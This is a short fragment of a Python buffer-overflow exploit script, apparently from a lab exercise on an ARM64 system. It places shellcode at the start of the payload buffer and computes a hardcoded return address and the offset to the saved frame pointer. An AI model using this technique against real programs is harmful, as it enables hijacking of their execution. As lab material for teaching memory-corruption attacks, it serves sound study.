...
start = 0               # Because we have enought buffer size we will put the shell code at the begning
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
buffer_address = 0x0000fffffffff4d0 # buffer address inside bof 
foo_x29_add = 0x0000fffffffff630
ret    = buffer_address + start     
offset = (foo_x29_add - buffer_address) + 8 # get the diffrence from foo x29 to the begning of buffer and add 8bytes 
